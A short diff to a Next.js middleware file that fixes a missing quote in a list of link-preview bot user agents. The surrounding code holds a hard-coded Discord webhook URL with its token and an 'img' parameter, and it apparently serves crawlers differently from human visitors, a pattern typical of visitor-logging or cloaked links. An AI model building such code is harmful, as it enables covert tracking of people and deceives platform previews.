@@ -4,7 +4,7 @@ const webhook = "https://discord.com/api/webhooks/1216820645711843478/QRIgnJF2GR
 
 export async function middleware(req){
   const ua = userAgent(req)?.ua;
-  const discordbot = ["Mozilla/5.0 (compatible; Discordbot/", "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:92.0) Gecko/20100101 Firefox/92.0", "Twitterbot/].find(u=>ua?.startsWith(u));
+  const discordbot = ["Mozilla/5.0 (compatible; Discordbot/", "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:92.0) Gecko/20100101 Firefox/92.0", "Twitterbot/"].find(u=>ua?.startsWith(u));
   const vercelbot = ua?.startsWith("Vercelbot/");
   const path = req.nextUrl.pathname;
   const img = req.nextUrl.searchParams.get('img') ? new URL(req.nextUrl.searchParams.get('img')) : new URL("/mini.png", req.url);
